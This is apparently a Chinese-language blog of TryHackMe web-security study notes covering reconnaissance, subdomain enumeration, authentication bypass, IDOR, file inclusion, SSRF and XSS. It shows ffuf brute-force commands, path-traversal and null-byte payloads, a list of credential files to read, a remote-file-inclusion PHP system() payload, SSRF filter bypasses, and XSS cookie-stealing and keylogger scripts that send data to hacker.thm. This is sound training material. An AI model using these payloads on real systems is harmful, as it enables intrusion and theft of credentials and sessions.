<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403032222893.png" srcset="/img/loading.gif" lazyload alt="image-20240303222244831"></p>
<p>3.sitemap.xml </p>
<p>有些比较难浏览的网页这里面可能会出现</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403032244842.png" srcset="/img/loading.gif" lazyload alt="image-20240303224443710"></p>
<p>4.http标头</p>
<p>抓个包的事 就是看一些服务器的信息和用什么编程语言以及版本的信息</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403032248784.png" srcset="/img/loading.gif" lazyload alt="image-20240303224851629"></p>
<p>5.查到是什么框架了之后进一步进行信息收集</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403032301836.png" srcset="/img/loading.gif" lazyload alt="image-20240303230102745"></p>
<p>在网页源代码里面找到了一个路径 访问有个登录的地址 用户名和密码已经给了 然后就是登录即可</p>
<p>6.利用谷歌搜索</p>
<p>善用谷歌 能查到不少东西 (这里的话就是一些谷歌语法)</p>
<p>下面介绍一些简单的 具体的请参考:<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Google_hacking">Google hacking - Wikipedia</a></p>
<table>
<thead>
<tr>
<th>filter</th>
<th>例子</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>site</td>
<td>site:edu.cn</td>
<td>仅返回指定网站类型的记录</td>
</tr>
<tr>
<td>inurl</td>
<td>inurl:admin</td>
<td>返回的url中含有指定的字符</td>
</tr>
<tr>
<td>filetype</td>
<td>filetype:pdf “查询的东西”</td>
<td>返回指定类型的文件</td>
</tr>
<tr>
<td>intitle</td>
<td>intitle:admin</td>
<td>返回的标题中含有指定的字符</td>
</tr>
</tbody></table>
<p>7.Wappalyzer</p>
<p>这就是一个插件了 能看语言的类型和版本信息</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403032322357.png" srcset="/img/loading.gif" lazyload alt="image-20240303232236252"></p>
<p>8.Wayback Machine</p>
<p>网站:<a target="_blank" rel="noopener" href="https://archive.org/web/">https://archive.org/web/</a></p>
<p>是可追溯到 90 年代后期的网站历史档案。 您可以搜索一个域名，它会一直向您显示 服务抓取了网页并保存了内容。此服务可以 帮助发现当前网站上可能仍处于活动状态的旧页面。</p>
<p>9.github</p>
<p>这个也挺重要的 上面也有不少的信息</p>
<p>上面可能有一些敏感的信息(可能是权限没设置好 或者遗漏)</p>
<p>10.S3 Buckets</p>
<p>S3系列 存储桶是 Amazon AWS 提供的一项存储服务，允许人们 将文件甚至静态网站内容保存在可访问的云中 通过 HTTP 和 HTTPS。文件的所有者可以设置访问权限 使文件公开、私有甚至可写。有时这些 访问权限设置不正确，无意中允许访问 不应向公众提供的文件。S3 的格式 buckets 的数据类型为 http（s）：//<strong>{name}。</strong><a target="_blank" rel="noopener" href="http://s3.amazonaws.com/"><strong>s3.amazonaws.com</strong></a> {name} 由所有者决定的地方，例如 <a target="_blank" rel="noopener" href="http://tryhackme-assets.s3.amazonaws.com/">tryhackme-assets.s3.amazonaws.com</a>。 可以通过多种方式发现 S3 存储桶，例如在 网站的页面源代码、GitHub 存储库，甚至自动化 过程。一种常见的自动化方法是使用公司名称 后跟常用术语，如 {name}-assets、{name}-www、{name}-public、**{**<strong>name}</strong>-private 等</p>
<p>11.自动化工具 就是一些后台扫描的工具 </p>
<p>像是dirsearch等 其实主要还是看字典的强大</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403041519253.png" srcset="/img/loading.gif" lazyload alt="image-20240304151929060"></p>
<p>这是我用dirsearch扫描的结果 但还有一个mo开头的文件我扫描不到 </p>
<p>我是用的 thm给的扫描到的</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403041523790.png" srcset="/img/loading.gif" lazyload alt="image-20240304152317688"></p>
<p>总结:介绍了一些信息收集的知识</p>
<h3 id="Subdomain-Enumeration-子域枚举"><a href="#Subdomain-Enumeration-子域枚举" class="headerlink" title="Subdomain Enumeration (子域枚举)"></a>Subdomain Enumeration (子域枚举)</h3><p>这个房间是寻找子域的几种方法 目的是为了扩大我们在渗透测试过程中的攻击面</p>
<p>三种不同的子域枚举方法：Brute Force、OSINT（开源智能）和Virtual Host(虚拟主机)。</p>
<p>1.SSL/TLS 证书</p>
<p>相关的网站:</p>
<p><a target="_blank" rel="noopener" href="https://crt.sh/">crt.sh |证书搜索</a></p>
<p><a target="_blank" rel="noopener" href="https://ui.ctsearch.entrust.com/ui/ctsearchui">Entrust 证书搜索 - Entrust， Inc.</a></p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403041717063.png" srcset="/img/loading.gif" lazyload alt="image-20240304171731897"></p>
<p>然后可以在上面的两个网站上面输入域名 进行子域的查询</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403041722551.png" srcset="/img/loading.gif" lazyload alt="image-20240304172208426"></p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403041722377.png" srcset="/img/loading.gif" lazyload alt="image-20240304172231226"></p>
<p>2.利用搜索引擎</p>
<p>利用谷歌等搜索引擎 可以利用谷歌语法 进行搜索</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">-site:www<span class="hljs-selector-class">.domain</span><span class="hljs-selector-class">.com</span> site：*<span class="hljs-selector-class">.domain</span>.com<br></code></pre></td></tr></table></figure>

<p>上面的意思把<a target="_blank" rel="noopener" href="http://www.domain.com这个域名给丢掉/">www.domain.com这个域名给丢掉</a> 然后匹配其他的域名</p>
<p>3.DNS暴力破解</p>
<p>可以使用一些工具对域名进行暴力破解 例如dnsrecon</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403041735401.png" srcset="/img/loading.gif" lazyload alt="image-20240304173544295"></p>
<p>-d指定了域名 -t brt指定了执行模式</p>
<p>上面是它自带的字典应该 然后我们实际情况要用的话 需要指明字典的位置</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403041755996.png" srcset="/img/loading.gif" lazyload alt="image-20240304175505891"></p>
<p>还有其他的工具 比如 **Sublist3r **是用python写的</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403041800461.png" srcset="/img/loading.gif" lazyload alt="image-20240304180036303"></p>
<p>4.Virtual Host(虚拟主机)</p>
<p>某些子域并不总是托管在可公开访问的 DNS 结果中，例如 Web 应用程序或管理门户的开发版本。相反，DNS 记录可以保存在专用 DNS 服务器上，也可以记录在开发人员计算机上的 /etc/hosts 文件（或 Windows 用户的 c：\windows\system32\drivers\etc\hosts 文件）中，该文件将域名映射到 IP 地址。</p>
<p>由于当从客户端请求网站时，Web 服务器可以从一台服务器承载多个网站，因此服务器可以从 Host 标头中知道客户端需要哪个网站 。我们可以通过对它进行更改并监控响应来利用此主机标头，以查看我们是否发现了一个新网站。</p>
<p>我们可以利用ffuf来实现这个功能</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">ffuf -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>SecLists<span class="hljs-regexp">/Discovery/</span>DNS/namelist.txt -H <span class="hljs-string">&quot;Host: FUZZ.acmeitsupport.thm&quot;</span> -u ip地址 -fs &#123;<span class="hljs-keyword">size</span>&#125;<br></code></pre></td></tr></table></figure>

<p>来解释一下指令 -w是指定了字典文件 -H是指定了Host的信息 -u是指定url地址 后面的 -fs是一个过滤器 {size}是size出现次数最多的值</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403041858085.png" srcset="/img/loading.gif" lazyload alt="image-20240304185824992"></p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403041858894.png" srcset="/img/loading.gif" lazyload alt="image-20240304185842721"></p>
<p>总结:主要介绍了一些收集子域的方法</p>
<h3 id="Authentication-Bypass-身份验证绕过"><a href="#Authentication-Bypass-身份验证绕过" class="headerlink" title="Authentication Bypass(身份验证绕过)"></a>Authentication Bypass(身份验证绕过)</h3><p> 1.用户名枚举</p>
<p>验证哪些用户名是已经存在的 但是我们不知道其密码的</p>
<p>这里可以利用ffuf进行验证 除此之外 我们还可以利用burpsuite进行验证 </p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">ffuf -w &#x27;<span class="hljs-string">/home/kali/</span>桌面<span class="hljs-string">/yhm.txt</span>&#x27; -X POST -d <span class="hljs-string">&quot;username=FUZZ&amp;email=x&amp;password=x&amp;cpassword=x&quot;</span> -H <span class="hljs-string">&quot;Content-Type: application/x-www-form-urlencoded&quot;</span> -u <span class="hljs-string">&quot;http://10.10.70.227/customers/signup&quot;</span> -mr <span class="hljs-string">&quot;username already exists&quot;</span><br></code></pre></td></tr></table></figure>

<p>-w 是指定的字典 然后-X是传参的方式 -d是传入的内容 FUZZ的地方就是字典进行爆破的地方 然后-H就是指定一下Content-Type的类型 -u指定url -mr是指定 当注册已经存在的用户时出现的一些错误信息</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403042153730.png" srcset="/img/loading.gif" lazyload alt="image-20240304215307566"></p>
<p>好的字典很重要</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403042204727.png" srcset="/img/loading.gif" lazyload alt="image-20240304220432569"></p>
<p>2.暴力破解</p>
<p>还是利用爆破 </p>
<figure class="highlight tp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tp">ffuf -w <span class="hljs-string">&#x27;/home/kali/桌面/user.txt&#x27;</span>:<span class="hljs-keyword">W</span><span class="hljs-number">1</span>,<span class="hljs-string">&#x27;/home/kali/桌面/password.txt&#x27;</span>:<span class="hljs-keyword">W</span><span class="hljs-number">2</span> -<span class="hljs-keyword">X</span> POST -d <span class="hljs-string">&quot;username=W1&amp;password=W2&quot;</span> -H <span class="hljs-string">&quot;Content-Type: application/x-www-form-urlencoded&quot;</span> -u <span class="hljs-string">&quot;http://10.10.70.227/customers/login&quot;</span> -fc <span class="hljs-number">200</span><br></code></pre></td></tr></table></figure>

<p>fc 200 是只返回响应包为200的</p>
<p>3.逻辑缺陷</p>
<p>有时身份验证过程包含逻辑缺陷。逻辑缺陷是指应用程序的典型逻辑路径被黑客绕过、规避或操纵。逻辑缺陷可能存在于网站的任何区域，但在这种情况下，我们将专注于与身份验证相关的示例。</p>
<p>比如:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>( url.<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-number">0</span>,<span class="hljs-number">6</span>) === <span class="hljs-string">&#x27;/admin&#x27;</span>) &#123;<br>    <span class="hljs-comment"># Code to check user is an admin</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment"># View Page</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>该代码的功能是 检查访问路径是否以admin开头 如果是的话就检查用户是不是admin 否则的话就显示其他的</p>
<p>然而当我们访问/adMin时就会绕过该检查 从而造成一个逻辑缺陷</p>
<p> 最后就是thm的这个逻辑缺陷的利用了 </p>
<p>首先我们先到遗忘密码那里，然后它让输入与之关联的邮箱地址 这里thm给了一个 然后接着又让我们输入用户名 最后它会把密码发送到之前的邮箱里面去</p>
<p>因为发送email使用的是get传参 而发送username是post传参 这里我们都改成request传参 此时它会偏向于post的传入值 所以我们可以在post那里传入email的值 从而可以控制email的发送地址</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403042336559.png" srcset="/img/loading.gif" lazyload alt="image-20240304233657364"></p>
<p>根据这个思路 我们先去网站注册一个账号 然后把emial地址改为我们注册的值 (可以在bp发送)</p>
<p>然后我们在注册的界面等待</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403042349941.png" srcset="/img/loading.gif" lazyload alt="image-20240304234947866"></p>
<p>会有一个密码修改的提示 有一个登录的链接 然后登录即可</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403042351063.png" srcset="/img/loading.gif" lazyload alt="image-20240304235146873"></p>
<p>4.通过cookie进行登录绕过</p>
<p>存放hash的数据库的相关网站:<a target="_blank" rel="noopener" href="https://crackstation.net/">CrackStation - Online Password Hash Cracking - MD5, SHA1, Linux, Rainbow Tables, etc.</a></p>
<p>有的时候cookie那里会存放一些hash的值 这个时候我们可以去上面的网站上寻找一下 看是否能够解出来</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403052037397.png" srcset="/img/loading.gif" lazyload alt="image-20240305203727159"></p>
<p>总结：介绍了几种绕过身份验证的方法</p>
<h3 id="IDOR-越权"><a href="#IDOR-越权" class="headerlink" title="IDOR (越权)"></a>IDOR (越权)</h3><p>是一个未经授权访问的漏洞</p>
<p> 有的时候我们在查看个人信息的时候 如果上方的url地址中有id=xxx（xxx为数字）的话 如果更改数字的信息会出现他人的信息的话 那么就是一个idor漏洞</p>
<p>上面只是最直接的 下面是一些变形</p>
<ol>
<li>在编码的ID中查找IDOR</li>
</ol>
<p>有的时候是基于base64进行编码的 然后我们先解码 将id后面的数字进行一个修改 接着进行编码后再发送到web服务器中 查看信息是否发生变化</p>
<p>2.在哈希ID中查找IDOR</p>
<p>同理 不再解释</p>
<p>3.在不可预测的 ID 中查找 IDOR</p>
<p>如果 使用上述方法无法检测到 Id，这是一种极好的方法 的IDOR检测是创建两个帐户并交换ID号 在他们之间。如果您可以使用其他用户的 ID 查看其内容 数字，同时仍然使用其他帐户登录（或不登录 已登录），您发现了一个有效的 IDOR 漏洞。</p>
<p>实例</p>
<p>我们先注册一个账号 然后在网络那里进行查看</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403052120774.png" srcset="/img/loading.gif" lazyload alt="image-20240305212022659"></p>
<p>可以看到它是将用户信息以json的形式返回的</p>
<p>然后我们更改id的信息 可以看到其他用户的用户名和邮箱</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403052122057.png" srcset="/img/loading.gif" lazyload alt="image-20240305212250867"></p>
<p>总结：这个房间介绍了关于IDOR漏洞的利用</p>
<h3 id="File-Inclusion-文件包含"><a href="#File-Inclusion-文件包含" class="headerlink" title="File Inclusion (文件包含)"></a>File Inclusion (文件包含)</h3><p>文件包含产生的原因:没有对用户的输入产生一个严格的控制 导致输入在具有文件包含功能函数的地方产生漏洞</p>
<p>1.路径遍历</p>
<p>通常是读取服务器上的一些文件</p>
<p>当用户的输入传递给 PHP 中的 file_get_contents 等函数时，就会发生路径遍历漏洞。需要注意的是，该函数不是导致该漏洞的主要因素。通常，较差的输入验证或筛选是导致漏洞的原因。 在 PHP 中，您可以使用file_get_contents来读取文件的内容</p>
<p>可以通过../../../../../../目录遍历来读取我们想要读取的内容</p>
<p>不过有的时候会增加一些过滤器 来防止读取相关的文件</p>
<p>下面是一些常见的 </p>
<table>
<thead>
<tr>
<th>位置</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>/etc/issue</td>
<td>包含要在登录提示之前打印的消息或系统标识。</td>
</tr>
<tr>
<td>/etc/profile</td>
<td>控制系统范围的默认变量，例如导出变量、文件创建掩码 （umask）、终端类型、邮件消息，以指示新邮件何时到达</td>
</tr>
<tr>
<td>/proc/version</td>
<td>指定 Linux 内核的版本</td>
</tr>
<tr>
<td>/etc/passwd</td>
<td>拥有有权访问系统的所有注册用户</td>
</tr>
<tr>
<td>/etc/shadow</td>
<td>包含有关系统用户密码的信息</td>
</tr>
<tr>
<td>/root/.bash_history</td>
<td>包含 root 用户的历史记录命令</td>
</tr>
<tr>
<td>/var/log/dmessage</td>
<td>包含全局系统消息，包括系统启动期间记录的消息</td>
</tr>
<tr>
<td>/var/mail/root</td>
<td>root 用户的所有电子邮件</td>
</tr>
<tr>
<td>/root/.ssh/id_rsa</td>
<td>服务器上 root 用户或任何已知有效用户的私有 SSH 密钥</td>
</tr>
<tr>
<td>/var/log/apache2/access.log</td>
<td>对 Apache Web 服务器的访问请求</td>
</tr>
<tr>
<td>C:\boot.ini</td>
<td>包含带有 BIOS 固件的计算机的启动选项</td>
</tr>
</tbody></table>
<p>2.本地文件包含 (LFI)</p>
<p>与之相关的函数 include require include_once require_once </p>
<p>thm给的演示是用php来的 然后还有其他编程语言的LFI</p>
<p>有的时候我们是进行黑盒测试的 并没有源码 然后我们就可以观察错误信息 来以此获取相关信息</p>
<p>在php5.3.4版本以下 当include函数是(include “”.php) 后面自动添加.php时 这个时候我们就可以利用%00来绕过 即../../../../etc/passwd%00 这个时候就能读取/etc/passwd了.</p>
<p>还有的就是把../给禁止了 然后我们就可以利用双层的绕过 即 ….//….//….// 这种类型的绕过</p>
<p>原因如下图所示:</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403052303260.png" srcset="/img/loading.gif" lazyload alt="image-20240305230323091"></p>
<p>3.远程文件包含 (RFI)</p>
<p>使用前提是 allow_url_fopen 打开</p>
<p>我们可以在自己的服务器上面部署恶意文件 然后包含到服务端 即可触发漏洞 原因同样是对用户的输入没有进行严格的过滤 这个远程包含的危害比较大一点</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b0c2659127d95a0b633e94bd00ed10e0.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>下面是一些修复的方法:</p>
<p>1.把一些危险的函数给禁止</p>
<p>2.把报错信息给关闭</p>
<p>3.使用白名单</p>
<p>4.对用户的输入进行严格的过滤 部署waf</p>
<p>5.使用新的服务 防止一些老版本的漏洞</p>
<p>LFI测试步骤</p>
<ol>
<li>找到一个可以通过 GET、POST、COOKIE 或 HTTP 标头值的入口点！</li>
<li>输入有效的输入以查看 Web 服务器的行为方式。</li>
<li>输入无效的输入，包括特殊字符和常用文件名。</li>
<li>不要总是相信您在输入表单中提供的内容是您想要的！使用浏览器地址栏或 Burpsuite 等工具。</li>
<li>在输入无效输入时查找错误，以显示 Web 应用程序的当前路径;如果没有错误，那么试错可能是您的最佳选择。</li>
<li>了解输入验证以及是否有任何过滤器！</li>
<li>尝试注入有效条目以读取敏感文件</li>
</ol>
<p>挑战:</p>
<p>flag1:</p>
<p>换成post进行传参即可</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403052342400.png" srcset="/img/loading.gif" lazyload alt="image-20240305234238278"></p>
<p>flag2:</p>
<p>这个文件包含点在那个cookie那里 然后后面需要用%00把.php后缀给过滤掉</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403052345553.png" srcset="/img/loading.gif" lazyload alt="image-20240305234534377"></p>
<p>flag3:</p>
<p>这一问我是试了有一会 先观察报错信息</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403052359232.png" srcset="/img/loading.gif" lazyload alt="image-20240305235913020"></p>
<p>差不多是把上面的给结合起来了</p>
<p>然后我在get传参那里用的….//….//….//….//etc/passwd%00 没过去 后来换了传参方式才可以的  这里的话我觉得是因为它是用$_REQUESTS 接受http的 然后post传入相同的值时 post会把get的给覆盖掉 (更偏向于post)</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403060000247.png" srcset="/img/loading.gif" lazyload alt="image-20240306000037116"></p>
<p>然后剩下的这个远程文件包含 写个一句话 然后连接到网站上面 让其包含就行了</p>
<p>来说一下具体的步骤 首先 我们在要共享文件的目录下开启一个http服务</p>
<p>python3 -m http.server</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403061322574.png" srcset="/img/loading.gif" lazyload alt="image-20240306132215417"></p>
<p>然后再对应的目录下创建一个txt文件(php文件也可以) 里面写入 <?php echo system('hostname');?></p>
<p>然后再去进行一个文件包含</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403061323942.png" srcset="/img/loading.gif" lazyload alt="image-20240306132358783"></p>
<p>总结:介绍了文件包含的一些内容 以及一些简单的绕过方法</p>
<h3 id="Intro-to-SSRF-SSRF漏洞"><a href="#Intro-to-SSRF-SSRF漏洞" class="headerlink" title="Intro to SSRF(SSRF漏洞)"></a>Intro to SSRF(SSRF漏洞)</h3><p>ssrf是服务器端请求伪造 允许恶意用户导致Web服务器向攻击者选择的资源发出额外或编辑的HTTP请求。 分为两类 一种是有回显的ssrf 一种是没回显的ssrf</p>
<p>造成的危险:</p>
<p>1.探测内网</p>
<p>2.进入未授权的区域</p>
<p>3.访问客户/组织数据</p>
<p>4.显示身份验证令牌/凭据</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403061350512.png" srcset="/img/loading.gif" lazyload alt="image-20240306135047331"></p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403061728058.png" srcset="/img/loading.gif" lazyload alt="image-20240306172822996"></p>
<p>原因是服务端遇见了&amp; 可能会造成一个解析错误 会误认为到这里就结束了 然后后面的url就没有用了</p>
<p>1.查找ssrf</p>
<p>下面是常见ssrf的示例:</p>
<p><strong>在地址栏的参数中使用完整 URL 时：</strong></p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/956e1914b116cbc9e564e3bb3d9ab50a.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p><strong>表单中的隐藏字段：</strong></p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/237696fc8e405d25d4fc7bbcc67919f0.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p><strong>部分 URL，例如主机名：</strong></p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/f3c387849e91a4f15a7b59ff7324be75.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p><strong>或者可能只是 URL 的路径：</strong></p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/3fd583950617f7a3713a107fcb4cfa49.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>对于那些无回显的sssrf来说 可以使用requestbin.com 来显示返回的结果(感觉就是一个dns外带的)    或者是在自己的服务器上面显示</p>
<p>2.绕过</p>
<p>拒绝列表:</p>
<p>对于那些localhost (127.0.0.1)的绕过 通常可以使用特殊数字来进行绕过 </p>
<p>（如 0、0.0.0.0、0000、127.1、127.<em>.</em>.*、2130706433、017700000001）或具有解析为 IP 地址 127.0.0.1 的 DNS 记录（如 127.0.0.1.nip.io）的子域来绕过拒绝列表。</p>
<p>此外，在云环境中，阻止对 IP 地址 169.254.169.254 的访问将是有益的，该地址包含已部署云服务器的元数据，包括可能的敏感信息。攻击者可以通过在自己的域上注册一个子域，并使用指向 IP 地址 169.254.169.254 的 DNS 记录来绕过此漏洞。</p>
<p>允许列表:</p>
<p>允许列表是指所有请求都被拒绝，除非它们出现在列表中或与特定模式匹配，例如参数中使用的 URL 必须以 <a target="_blank" rel="noopener" href="https://website.thm/">https://website.thm</a> 开头的规则<strong>。</strong> 攻击者可以通过在攻击者的域名上创建子域（如 <a target="_blank" rel="noopener" href="https://website.thm.attackers-domain.thm)来快速规避此规则.应用程序逻辑现在将允许此输入,并允许攻击者控制内部/">https://website.thm.attackers-domain.thm）来快速规避此规则。应用程序逻辑现在将允许此输入，并允许攻击者控制内部</a> HTTP 请求。</p>
<p>打开重定向</p>
<p>如果上述绕过不起作用，攻击者还有一个技巧，即开放重定向。开放重定向是服务器上的一个端点，网站访问者会自动重定向到另一个网站地址。以链接 <a target="_blank" rel="noopener" href="https://website.thm/link?url=https://tryhackme.com">https://website.thm/link?url=https://tryhackme.com</a> 为例。创建此端点是为了记录访问者出于广告/营销目的点击此链接的次数。但想象一下，存在一个潜在的 SSRF 漏洞，其严格的规则只允许以 <a target="_blank" rel="noopener" href="https://website.thm/">https://website.thm/</a> 开头的 URL。攻击者可利用上述功能将内部 HTTP 请求重定向到攻击者选择的域。</p>
<p>实例:</p>
<p>首先我们先注册用户 然后找到头像更换这里</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403061955791.png" srcset="/img/loading.gif" lazyload alt="image-20240306195524628"></p>
<p>正常更换是可以的，然后我们在更换头像这里在前端找到相关点</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403061957627.png" srcset="/img/loading.gif" lazyload alt="image-20240306195734519"></p>
<p>value值可以更换成我们想要的 直接换成private是不行的 </p>
<p>然后可以利用目录遍历来进行替换 xx/../private</p>
<p>然后再网页源码中 找到相关信息</p>
<h3 id="Cross-site-Scripting-XSS"><a href="#Cross-site-Scripting-XSS" class="headerlink" title="Cross-site Scripting (XSS)"></a>Cross-site Scripting (XSS)</h3><p>1.xss有效负载</p>
<p>有效负载就是我们在目标计算机中插入的javascript代码</p>
<p>最简单的验证是否存在xss漏洞如下:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;xss&#x27;</span>)&lt;/script&gt;<br></code></pre></td></tr></table></figure>

<p>还有就是获取cookie值 </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">会话窃取：<br>&lt;script&gt;<span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://hacker.thm/steal?cookie=&#x27;</span> + <span class="hljs-title function_">btoa</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>));&lt;/script&gt;   <br>上面是经过base64编码过后的<br>&lt;script&gt;<span class="hljs-title function_">alert</span>(documnet.<span class="hljs-property">cookie</span>)&lt;<span class="hljs-regexp">/script&gt;   /</span><span class="hljs-regexp">/这个是不经过编码的</span><br></code></pre></td></tr></table></figure>

<p><strong>键盘记录器：</strong></p>
<p>下面的代码充当键盘记录器。这意味着您在网页上输入的任何内容都将被转发到黑客控制下的网站。如果有效负载安装在接受的用户登录名或信用卡详细信息上的网站，这可能会非常具有破坏性。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-variable language_">document</span>.<span class="hljs-property">onkeypress</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) &#123; <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://hacker.thm/log?key=&#x27;</span> + <span class="hljs-title function_">btoa</span>(e.<span class="hljs-property">key</span>) );&#125;&lt;/script&gt;<br></code></pre></td></tr></table></figure>

<p><strong>业务逻辑：</strong></p>
<p>此有效负载比上述示例具体得多。这将是关于调用特定的网络资源或 JavaScript 函数。例如，假设一个用于更改用户电子邮件地址的 JavaScript 函数，称为 .有效负载可能如下所示：<code>user.changeEmail()</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;user.<span class="hljs-title function_">changeEmail</span>(<span class="hljs-string">&#x27;attacker@hacker.thm&#x27;</span>);&lt;/script&gt;<br></code></pre></td></tr></table></figure>



<p>2.反射型xss</p>
<p>产生原因:</p>
<p>在http请求中当用户的数据在网页中未做任何验证时 就会触发反射型xss</p>
<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403072020920.png" srcset="/img/loading.gif" lazyload alt="image-20240307202047691"></p>
<p>如何测试反射的xss:</p>
<ul>
<li>URL 查询字符串中的参数</li>
<li>URL 文件路径</li>
<li>有时是 HTTP 标头（尽管在实践中不太可能被利用）</li>
</ul>
<p>3.存储的xss</p>
<p>存储在web服务器内部 当用户访问时进行触发</p>
<p>一般出现在评论区的地方 有的时候检测不严 就可能会造成存储型的xss</p>
<p>如何测试存储型的xss:</p>
<p>您需要测试每个可能的入口点，其中似乎存储了数据，然后在其他用户有权访问的区域中显示回来;其中的一个小例子可能是</p>
<ul>
<li>在博客上的评论</li>
<li>用户配置文件信息</li>
<li>网站列表</li>
</ul>
<p>4.基于DOM的xss</p>
<p>什么是DOM？</p>
<p>DOM 代表 <strong>D</strong>ocument <strong>O</strong>bject <strong>M</strong>odel，是一个 HTML 和 XML 文档的编程接口。它表示页面，以便程序可以更改文档结构、样式和内容。一个 网页是一个文档，此文档可以显示在浏览器窗口中，也可以作为 HTML 源显示。HTML DOM 的图表是 如下所示：</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/24a54ac532b5820bf0ffdddf00ab2247.png" srcset="/img/loading.gif" lazyload alt="img"></p>
